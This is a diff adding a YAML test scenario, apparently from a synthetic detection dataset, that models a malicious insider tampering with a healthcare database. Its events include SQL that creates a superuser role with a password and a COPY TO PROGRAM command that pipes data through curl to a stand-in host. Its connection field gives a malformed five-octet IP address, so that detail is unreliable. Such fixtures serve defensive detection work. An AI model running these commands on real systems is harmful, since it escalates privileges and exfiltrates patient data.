@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_03_data_tamper_mal_66
+family_id: gen_healthcare_03_data_tamper_mal_fam66
+domain: healthcare
+time_of_day: '22:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_153331 SUPERUSER LOGIN PASSWORD 'x140899'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://deid-partner.example/ingest
+      -d @-'
+    connects_to:
+      ip: 193.42.33.205.211
+      port: 8080
